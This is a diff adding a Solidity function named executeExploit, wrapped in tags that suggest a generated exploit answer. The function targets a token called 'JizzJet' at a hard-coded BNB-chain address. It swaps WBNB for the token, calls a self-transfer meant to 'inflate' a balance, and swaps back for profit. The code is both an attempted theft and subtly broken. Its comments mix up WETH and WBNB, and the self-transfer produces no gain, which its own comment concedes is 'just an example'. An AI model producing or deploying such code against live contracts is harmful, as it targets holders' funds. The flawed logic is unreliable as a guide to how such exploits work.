@@ -1,0 +1,22 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // 1. Get valuable token
+    address[] memory path = new address[](2);
+    path[0] = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c); // WBNB
+    path[1] = address(0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2); // JizzJet
+
+    // 2. Swap WETH to JizzJet
+    uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(0, path, address(this), block.timestamp);
+
+    // 3. Perform actions to inflate the WBNB balance (in your case, interact with JizzJet)
+    IJizzJet(target).transfer(address(this), amount); // Just an example interaction, adjust as necessary to produce profit
+
+    // 4. Swap JizzJet back to WETH
+    uint256 jizzJetBalance = IERC20(path[1]).balanceOf(address(this));
+    IERC20(path[1]).approve(address(uniswapRouter), jizzJetBalance);
+
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(jizzJetBalance, 0, path, address(this), block.timestamp);
+}
+</executeExploitCode>
+```
